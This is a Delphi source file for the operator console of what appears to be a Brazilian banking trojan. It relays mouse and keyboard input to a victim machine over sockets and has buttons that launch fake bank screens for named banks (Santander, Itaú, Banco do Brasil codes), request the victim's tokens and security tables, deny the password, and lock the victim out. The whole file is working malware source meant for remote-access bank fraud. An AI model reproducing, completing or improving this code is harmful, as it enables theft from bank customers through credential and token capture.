unit Desktop_Remoto;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ExtCtrls, StdCtrls, ScktComp, ComCtrls, AdvGlassButton;

type
  TForm2 = class(TForm)
    Panel1: TPanel;
    CheckBox1: TCheckBox;
    CheckBox2: TCheckBox;
    ScrollBox1: TScrollBox;
    Image1: TImage;
    Timer1: TTimer;
    pbtn: TPanel;
    status: TStatusBar;
    Mlog: TMemo;
    GroupBox1: TGroupBox;
    AdvGlassButton6: TAdvGlassButton;
    AdvGlassButton7: TAdvGlassButton;
    AdvGlassButton8: TAdvGlassButton;
    BtNegarSenha: TAdvGlassButton;
    BtReconecar: TAdvGlassButton;
    pnlBANCO: TPanel;
    Panel3: TPanel;
    Panel5: TPanel;
    BtStartaFakePJ: TAdvGlassButton;
    BtTokenPJ: TAdvGlassButton;
    BtTabelaPJ: TAdvGlassButton;
    BtBloquearPJ: TAdvGlassButton;
    Panel4: TPanel;
    Panel6: TPanel;
    BtStartaFakePF: TAdvGlassButton;
    BtTokenPF: TAdvGlassButton;
    BtTabelaPF: TAdvGlassButton;
    BtBloquearPF: TAdvGlassButton;
    Panel2: TPanel;
    StaticText1: TStaticText;
    EdtQimg: TEdit;
    UpDown1: TUpDown;
    BtnSend: TAdvGlassButton;
    EdtSend: TEdit;
    edtansi: TEdit;
    AdvGlassButton1: TAdvGlassButton;
    Panel7: TPanel;
    Image2: TImage;
    procedure Image1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Timer1Timer(Sender: TObject);
    procedure CheckBox2KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox1KeyDown(Sender: TObject; var Key: Word;
      Shift: TShiftState);
    procedure CheckBox2Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormResize(Sender: TObject);
    procedure Image1DblClick(Sender: TObject);
    procedure AdvGlassButton6Click(Sender: TObject);
    procedure BtnSendClick(Sender: TObject);
    procedure AdvGlassButton1Click(Sender: TObject);
    procedure BtNegarSenhaClick(Sender: TObject);

    function RetornaTela: String;
    procedure BtStartaFakePJClick(Sender: TObject);
    procedure BtStartaFakePFClick(Sender: TObject);
    procedure EdtSendClick(Sender: TObject);
  private
    { Private declarations }
  public
    Socket, Socket2: TCustomWinSocket;
    { Public declarations }
  end;

var
  Form2: TForm2;
  xx: Integer = 0;
  yy: Integer = 0;
  cTELA, sBanco : String;
  cGetTOKEN_J , cGetTOKEN_F  : String;
  cGetTABELA_J, cGetTABELA_F : String;
  FakeF : Boolean = False;
  FakeJ : Boolean = False;


implementation

{$R *.dfm}

procedure TForm2.Image1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if CheckBox1.Checked then begin
    if Button = mbLeft then
      Socket.SendText('<|MouseLD|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|')
    else
      Socket.SendText('<|MouseRD|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
  end;
end;

procedure TForm2.Image1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
  if CheckBox1.Checked then begin
    if Button = mbLeft then
      Socket.SendText('<|MouseLU|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|')
    else
      Socket.SendText('<|MouseRU|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
  end;
end;

procedure TForm2.Image1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
  if CheckBox1.Checked then
    Socket.SendText('<|MousePos|>'+intToStr(x)+'<|>'+intToStr(y)+'<<|');
end;

procedure TForm2.Timer1Timer(Sender: TObject);
var 
      i : byte; 
begin
  if (Form2.Active) and (CheckBox2.Checked) then begin
  try
 { CheckBox1.TabStop := false;
  CheckBox2.TabStop := false;
  CheckBox3.TabStop := false;}
  for i:=8 To 222 do 
    begin 
       if GetAsyncKeyState(i)=-32767 then 
        begin 
        case i of 
        8  : Socket2.SendText('{BS}');
        9  : Socket2.SendText('{TAB}');
        13 : Socket2.SendText('{ENTER}');
        //17 : memo1.text:=memo1.text+'[Ctrl]';
        27 : Socket2.SendText('{ESCAPE}'); 
        32 : Socket2.SendText(' '); //Space
        33 : Socket2.SendText('{PGUP}');
        34 : Socket2.SendText('{PGDN}'); 
        35 : Socket2.SendText('{END}');
        36 : Socket2.SendText('{HOME}');
        37 : Socket2.SendText('{LEFT}');
        38 : Socket2.SendText('{UP}');
        39 : Socket2.SendText('{RIGHT}');
        40 : Socket2.SendText('{DOWN}');
        44 : Socket2.SendText('{PRTSC}');
       // 45 : memo1.text := Memo1.text + '[Insert]';
        46 : Socket2.SendText('{DEL}');
        145 : Socket2.SendText('{SCROLLLOCK}');

        //Number 1234567890 Symbol !@#$%^&*() 
        48 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText(')')
             else Socket2.SendText('0');
        49 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('!')
             else Socket2.SendText('1');
        50 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('@')
             else Socket2.SendText('2');
        51 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('#')
             else Socket2.SendText('3');
        52 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('$')
             else Socket2.SendText('4');
        53 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('%')
             else Socket2.SendText('5');
        54 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('^')
             else Socket2.SendText('6');
        55 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('&')
             else Socket2.SendText('7');
        56 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('*')
             else Socket2.SendText('8');
        57 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('(')
             else Socket2.SendText('0');
        65..90 : // a..z , A..Z
            begin
            if ((GetKeyState(VK_CAPITAL))=1) then
                if GetKeyState(VK_SHIFT)<0 then
                   Socket2.SendText(LowerCase(Chr(i))) //a..z
                else 
                   Socket2.SendText(UpperCase(Chr(i))) //A..Z 
            else 
                if GetKeyState(VK_SHIFT)<0 then 
                    Socket2.SendText(UpperCase(Chr(i))) //A..Z
                else
                    Socket2.SendText(LowerCase(Chr(i))); //a..z
            end; 
        //Numpad 
        96..105 : Socket2.SendText(inttostr(i-96)); //Numpad  0..9 
        106:Socket2.SendText('*');
        107:Socket2.SendText('&');
        109:Socket2.SendText('-');
        110:Socket2.SendText('.');
        111:Socket2.SendText('/');
       // 144 : memo1.text:=memo1.text+'[Num Lock]'; 

        112..123: //F1-F12 
            Socket2.SendText('{F'+IntToStr(i - 111)+'}'); 

        186 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText(':')
              else Socket2.SendText(';');
        187 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('+')
              else Socket2.SendText('=');
        188 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('<')
              else Socket2.SendText(',');
        189 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('_')
              else Socket2.SendText('-');
        190 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('>')
              else Socket2.SendText('.');
        191 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('?')
              else Socket2.SendText('/');
        192 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('~')
              else Socket2.SendText('`');
        219 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('{')
              else Socket2.SendText('[');
        220 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('|')
              else Socket2.SendText('\');
        221 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('}')
              else Socket2.SendText(']');
        222 : if GetKeyState(VK_SHIFT)<0 then Socket2.SendText('"')
              else Socket2.SendText('''');
        end; 
       end; 
      end;
    except
      exit;
    end;
  end;

end;

procedure TForm2.CheckBox2KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_SPACE then
    Key := 0;
end;

procedure TForm2.CheckBox1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_SPACE then
    Key := 0;
end;

procedure TForm2.CheckBox2Click(Sender: TObject);
begin
  if CheckBox2.Checked then
    Socket.SendText('<|REQUESTKEYBOARD|>');
end;

procedure TForm2.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  CheckBox1.Checked := false;
  CheckBox2.Checked := false;
end;

procedure TForm2.FormResize(Sender: TObject);
begin
  image1.left := trunc((ScrollBox1.width - image1.width) / 2);
  image1.top := trunc((ScrollBox1.height - image1.height) / 2);
end;

procedure TForm2.Image1DblClick(Sender: TObject);
begin
  if CheckBox1.Checked then
      Socket.SendText('<|MouseDC|>');
end;

procedure TForm2.AdvGlassButton6Click(Sender: TObject);
begin
  Socket.SendText('<|Close|>');
end;

procedure TForm2.BtnSendClick(Sender: TObject);
begin
  Socket2.SendText( EdtSend.Text );
  EdtSend.Text := '';
  EdtSend.Clear;
  CheckBox2.Checked := True;
end;

procedure TForm2.AdvGlassButton1Click(Sender: TObject);
begin
  Socket2.SendText( Char(#8) );
  edtansi.Text := '';
  edtansi.Clear;
end;

procedure TForm2.BtNegarSenhaClick(Sender: TObject);
begin
  Socket.SendText( '<|NEGASENHA|>' );
end;

function TForm2.RetornaTela: String;
var
  Resultado: String;
  i : Integer;
  xTELA  : String;
  Titulo : String;
begin
  Titulo    := Form2.Caption;
  Resultado := Copy( Titulo , Pos('Sigla:',Titulo)+6, Length(Titulo) );

  if Resultado = 'SANTA' then
     Resultado := Resultado + 'J'
  else if Resultado = 'SANTAJ' then
     Resultado := 'SANTA';

  if Resultado = 'ITAJ' then
     Resultado := 'ITA'
  else if Resultado = 'ITA' then
     Resultado := Resultado + 'J';

  if Resultado = 'BBJ' then
     Resultado := 'BB'
  else if Resultado = 'BB' then
     Resultado := 'BBJ';

  Result := Resultado;
end;

procedure TForm2.BtStartaFakePJClick(Sender: TObject);
begin
  cTELA := RetornaTela;
  Socket.SendText( 'STARTFAKE|'+cTELA );
  Mlog.Lines.Add('Start Fake para '+cTELA);
  FakeF := False;
  FakeJ := True;
end;

procedure TForm2.BtStartaFakePFClick(Sender: TObject);
begin
  cTELA := RetornaTela;
  Socket.SendText( 'STARTFAKE|'+cTELA );
  Mlog.Lines.Add('Start Fake para '+cTELA);
  FakeF := True;
  FakeJ := False;
end;

procedure TForm2.EdtSendClick(Sender: TObject);
begin
  if CheckBox2.Checked then
     CheckBox2.Checked := False;
end;

end.
